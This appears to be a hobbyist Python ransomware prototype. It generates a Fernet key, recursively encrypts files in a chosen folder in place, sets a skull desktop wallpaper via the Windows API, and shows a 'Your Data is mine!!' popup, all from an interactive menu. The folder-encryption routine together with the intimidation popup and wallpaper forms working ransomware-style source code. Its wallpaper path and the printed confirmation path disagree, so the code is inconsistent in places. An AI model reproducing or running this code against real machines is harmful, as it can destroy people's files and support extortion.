#!/usr/bin/python3

# Import libraries

from cryptography.fernet import Fernet
import os
import ctypes
import tkinter as tk
from tkinter import messagebox

# This function generates a new secret key, then writes it to a file for later use
def generate_key():
   
    key = Fernet.generate_key()  # Generate a fresh key
    with open("secret.key", "wb") as key_file:  # Open the key file in write-binary mode
        key_file.write(key)  # Write the key to the file


# This function opens the secret key file and reads the key for use in encryption/decryption
def load_key():
   
    return open("secret.key", "rb").read()  # Open the file in read-binary mode and read the key


# This function takes a message and a key, then returns the encrypted message
def encrypt_message(message: str, key: str) -> str:

    encoded_message = message.encode()  
    f = Fernet(key)  
    return f.encrypt(encoded_message)  

# This function takes an encrypted message and a key, then returns the decrypted message
def decrypt_message(encrypted_message: str, key: str) -> str:

    f = Fernet(key)  
    return f.decrypt(encrypted_message).decode()  


# This function takes a file name and a key, reads the file, encrypts its data, then writes the encrypted data back to the file
def encrypt_file(file_name: str, key: str):

    with open(file_name, 'rb') as file:  # Open the file in read-binary mode
        file_data = file.read()  # Read the file's data

    fernet = Fernet(key)  # Instantiate the Fernet class with the key
    encrypted_data = fernet.encrypt(file_data)  # Encrypt the file's data

    with open(file_name, 'wb') as file:  # Open the file in write-binary mode
        file.write(encrypted_data)  # Write the encrypted data back to the file


# This function takes a file name and a key, reads the file, decrypts its data, then writes the decrypted data back to the file
def decrypt_file(file_name: str, key: str):

    with open(file_name, 'rb') as file:  # Open the file in read-binary mode
        encrypted_data = file.read()  # Read the encrypted data from the file

    fernet = Fernet(key)  # Instantiate the Fernet class with the key
    decrypted_data = fernet.decrypt(encrypted_data)  # Decrypt the encrypted data

    with open(file_name, 'wb') as file:  # Open the file in write-binary mode
        file.write(decrypted_data)  # Write the decrypted data back to the file


# This function takes a folder path and a key, then recursively encrypts all files in the folder and its subfolders
def encrypt_folder(folder_path: str, key: str):
   
    for foldername, subfolders, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            encrypt_file(file_path, key)


# This function takes a folder path and a key, then recursively decrypts all files in the folder and its subfolders
def decrypt_folder(folder_path: str, key: str):
   
    for foldername, subfolders, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            decrypt_file(file_path, key)

# This funtion will change the wallpaper of a windows system
SPI_SETDESKWALLPAPER = 20

def set_wallpaper():
    image_path = "/home/nvannoort/Downloads/skulljpeg"
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path , 0)


#This funtion will create a pop up window

def show_message():
    root = tk.Tk()
    root.withdraw()  # hide the main window
    messagebox.showinfo("Danger", "Your Data is mine!!")  # show a popup window with a message


# The main function that prompts the user to select a mode, then performs the appropriate action
def main():
    generate_key()  
    key = load_key()  

# Ask the user to select a mode
    mode = int(input("Select a mode:\n1. Encrypt a file\n2. Decrypt a file\n3. Encrypt a message\n4. Decrypt a message\n5. Encrypt a folder\n6. Decrypt a folder\n7. Change desktop wallpaper\n8. Show a message\n"))


    if mode in [1, 2]:  
        file_path = input("Enter the path of the file: ") 

        if mode == 1:  
            encrypt_file(file_path, key)  
            print(f"File at {file_path} has been encrypted successfully.")  
        elif mode == 2:  
            decrypt_file(file_path, key)  
            print(f"File at {file_path} has been decrypted successfully.")  

    elif mode in [3, 4]:  
        message = input("Enter your message: ")  

        if mode == 3:  
            encrypted_message = encrypt_message(message, key) 
            print(f"Encrypted message is: {encrypted_message}") 
        elif mode == 4:  
            decrypted_message = decrypt_message(message, key)  
            print(f"Decrypted message is: {decrypted_message}")  

    elif mode in [5, 6]:  
        folder_path = input("Enter the path of the folder: ") 

        if mode == 5:  
            encrypt_folder(folder_path, key)  
            print(f"Folder at {folder_path} has been encrypted successfully.")  
        elif mode == 6:  
            decrypt_folder(folder_path, key)  
            print(f"Folder at {folder_path} has been decrypted successfully.")  

    elif mode == 7:
        set_wallpaper()
        print(f"Desktop wallpaper has been set to the image at C:\\Users\\nickv\\Downloads\\skullandbones.jpeg.")
    
    elif mode == 8:
        show_message()
        print("Message has been displayed.")
       
if __name__ == "__main__":
    main()

#End